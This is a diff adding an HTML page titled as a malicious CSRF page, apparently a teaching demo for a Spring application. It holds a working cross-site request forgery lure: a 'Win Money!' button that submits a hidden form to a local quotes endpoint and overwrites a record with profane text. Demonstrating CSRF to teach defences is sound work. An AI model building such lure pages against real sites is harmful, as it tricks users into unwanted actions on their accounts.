@@ -1,0 +1,29 @@
+<!DOCTYPE HTML>
+<html lang="en">
+    <head>
+        <title>Malicious page contains CSRF (i.e. Cross Site Request Forgery)</title>
+
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+
+        <link href="http://cdn.jsdelivr.net/webjars/bootstrap/3.3.4/css/bootstrap.min.css"
+              th:href="@{/webjars/bootstrap/3.3.5/css/bootstrap.min.css}"
+              rel="stylesheet" media="screen" />
+
+        <script src="http://cdn.jsdelivr.net/webjars/jquery/2.1.4/jquery.min.js"
+        th:src="@{/webjars/jquery/2.1.4/jquery.min.js}"></script>
+
+        <link href="../static/css/spring-core.css"
+              th:href="@{css/spring-core.css}" rel="stylesheet" media="screen"/>  
+
+    </head>
+    <body>
+        <div class="container">
+            <p>Want to win a lot of money with just <b>ONE</b> click!</p>
+            <form id="command" action="http://localhost:8080/quotes" method="post">
+                <input type="hidden" name="id" value="99">
+                <input type="hidden" name="content" value="Inappropriate text contains Profanity">
+                <input value="Win Money!" type="submit">
+            </form>
+        </div>
+    </body>
+</html>
